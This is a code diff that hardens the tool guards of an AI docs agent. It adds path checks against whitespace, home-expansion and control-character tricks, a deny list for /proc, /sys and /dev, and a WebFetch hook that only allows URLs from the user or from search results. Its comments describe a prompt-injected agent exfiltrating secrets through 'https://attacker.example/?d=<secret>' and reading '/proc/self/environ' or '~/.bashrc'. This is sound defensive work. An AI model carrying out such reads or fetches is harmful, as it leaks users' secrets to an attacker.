@@ -48,18 +48,49 @@ function insideRoot(realRoot: string, candidate: string): boolean {
   return candidate === realRoot || candidate.startsWith(realRoot.endsWith(path.sep) ? realRoot : realRoot + path.sep)
 }
 
+// C0, DEL and C1 controls. A real doc path never contains one.
+// eslint-disable-next-line no-control-regex
+const CONTROL_CHARS = /[\u0000-\u001f\u007f-\u009f]/
+/** Trees that hold process secrets or devices; denied by name even if some future root would contain them. */
+const DENIED_ROOTS = ["/proc", "/sys", "/dev"]
+
+/**
+ * Checks that must run on the RAW string, before any normalization. The Claude
+ * CLI normalizes a path argument before it opens it (it trims surrounding
+ * whitespace and expands `~` and `~/` to the home directory), so a guard that
+ * resolves the string as given approves `" /proc/self/environ"` or `"~/.bashrc"`
+ * while the tool then reads something else. The rule is therefore not "normalize
+ * the same way and compare" (any gap between the two normalizations is a hole)
+ * but "refuse every spelling that has a normalization at all": a value that
+ * the CLI would leave untouched is the only thing allowed through.
+ */
+function rawValueProblem(value: string, field: string): string | null {
+  if (value !== value.trim()) return `${field} has leading or trailing whitespace`
+  if (CONTROL_CHARS.test(value)) return `${field} contains a control character`
+  if (value.startsWith("~")) return `${field} starts with ~ (home expansion)`
+  if (/[$%]/.test(value)) return `${field} contains $ or % (variable expansion)`
+  if (/^["'\u0060]|["'\u0060]$/.test(value)) return `${field} is quoted`
+  if (value.includes("://")) return `${field} is a URL`
+  return null
+}
+
 function checkPath(value: unknown, field: string, realRoot: string): string | null {
   if (typeof value !== "string" || value.length === 0) return `${field} must be a non-empty string`
-  if (value.includes("\0")) return `${field} contains a NUL byte`
+  const raw = rawValueProblem(value, field)
+  if (raw) return raw
   // Relative paths are relative to the docs root (the agent's cwd).
-  const real = resolveReal(path.resolve(realRoot, value))
+  const resolved = path.resolve(realRoot, value)
+  if (DENIED_ROOTS.some((root) => resolved === root || resolved.startsWith(root + "/"))) return `${field} is a system path`
+  const real = resolveReal(resolved)
+  if (DENIED_ROOTS.some((root) => real === root || real.startsWith(root + "/"))) return `${field} is a system path`
   return insideRoot(realRoot, real) ? null : `${field} is outside the docs directory`
 }
 
 /** Glob/Grep patterns can carry an absolute or parent-relative anchor of their own, including inside braces. */
 function checkPattern(value: unknown): string | null {
   if (typeof value !== "string") return "pattern must be a string"
-  if (value.includes("\0")) return "pattern contains a NUL byte"
+  const raw = rawValueProblem(value, "pattern")
+  if (raw) return raw
   if (value.includes("..")) return "pattern may not contain .."
   if (/(^|[{,])\s*[/~]/.test(value) || /^[A-Za-z]:/.test(value)) return "pattern must be relative to the docs directory"
   return null
@@ -127,3 +158,96 @@ export function scrubbedAgentEnv(env: Record<string, string | undefined>): Recor
   for (const name of AGENT_PRIVATE_ENV) delete out[name]
   return out
 }
+
+// ── WebFetch ────────────────────────────────────────────────────────────────
+//
+// With the file tools confined, the remaining way for a prompt-injected agent to
+// get data off the box is a URL it chooses: `WebFetch https://attacker.example/?d=<secret>`
+// (the path works just as well as the query). A host allowlist cannot express
+// "whatever the user asked about", and a no-query rule still leaks through the
+// path. So WebFetch is limited to URLs that were not invented by the model:
+//
+//   - URLs that appear in the conversation text the user (or the replayed
+//     history) supplied, and
+//   - URLs returned by the Compass-hosted web_search tool in this very turn.
+//
+// Matching is exact on the normalized URL, so an allowed URL cannot be extended
+// with appended data. This keeps "read the page I named" and "follow a search
+// result", and drops "fetch a URL the model made up".
+
+const URL_PATTERN = /https?:\/\/[^\s<>"'\u0060)\]}\\]+/gi
+const MAX_ALLOWED_URLS = 500
+
+/** The canonical form used to compare URLs, or null for anything WebFetch should never see. */
+export function normalizeFetchUrl(value: unknown): string | null {
+  if (typeof value !== "string") return null
+  if (value !== value.trim() || CONTROL_CHARS.test(value)) return null
+  let url: URL
+  try {
+    url = new URL(value)
+  } catch {
+    return null
+  }
+  if (url.protocol !== "https:" && url.protocol !== "http:") return null
+  if (url.username || url.password) return null
+  url.hash = ""
+  return url.href
+}
+
+/** URLs mentioned in free text, trailing sentence punctuation removed. */
+export function extractUrls(text: string): string[] {
+  const out: string[] = []
+  for (const match of text.matchAll(URL_PATTERN)) {
+    const cleaned = match[0].replace(/[.,;:!?]+$/, "")
+    const normalized = normalizeFetchUrl(cleaned)
+    if (normalized) out.push(normalized)
+  }
+  return out
+}
+
+export function createAllowedUrls(seedText: string): Set<string> {
+  return new Set(extractUrls(seedText).slice(0, MAX_ALLOWED_URLS))
+}
+
+export function checkWebFetch(toolInput: unknown, allowed: ReadonlySet<string>): GuardDecision {
+  const url = toolInput && typeof toolInput === "object" ? (toolInput as Record<string, unknown>).url : undefined
+  const normalized = normalizeFetchUrl(url)
+  if (!normalized) return { allowed: false, reason: "Blocked: WebFetch needs a plain http(s) URL." }
+  if (!allowed.has(normalized)) {
+    return {
+      allowed: false,
+      reason: "Blocked: WebFetch only opens URLs the user gave you or that web_search returned in this conversation. Use web_search to find the page.",
+    }
+  }
+  return { allowed: true }
+}
+
+/** PreToolUse hook for WebFetch. */
+export function createWebFetchPreToolUseHook(allowed: ReadonlySet<string>) {
+  return async function webFetchPreToolUse(input: unknown): Promise<Record<string, unknown>> {
+    const event = (input ?? {}) as { tool_input?: unknown }
+    const decision = checkWebFetch(event.tool_input, allowed)
+    if (decision.allowed) return { continue: true }
+    return { hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: "deny", permissionDecisionReason: decision.reason } }
+  }
+}
+
+/** PostToolUse hook for the web_search tool: its results become fetchable. */
+export function createSearchResultCollector(allowed: Set<string>) {
+  return async function collectSearchUrls(input: unknown): Promise<Record<string, unknown>> {
+    try {
+      const event = (input ?? {}) as { tool_response?: unknown }
+      const text = typeof event.tool_response === "string" ? event.tool_response : JSON.stringify(event.tool_response ?? "")
+      for (const url of extractUrls(text)) {
+        if (allowed.size >= MAX_ALLOWED_URLS) break
+        allowed.add(url)
+      }
+    } catch {
+      /* a result we cannot read just stays unfetchable */
+    }
+    return { continue: true }
+  }
+}
+
+export const WEB_FETCH_MATCHER = "WebFetch"
+export const WEB_SEARCH_MATCHER = "mcp__web_search"
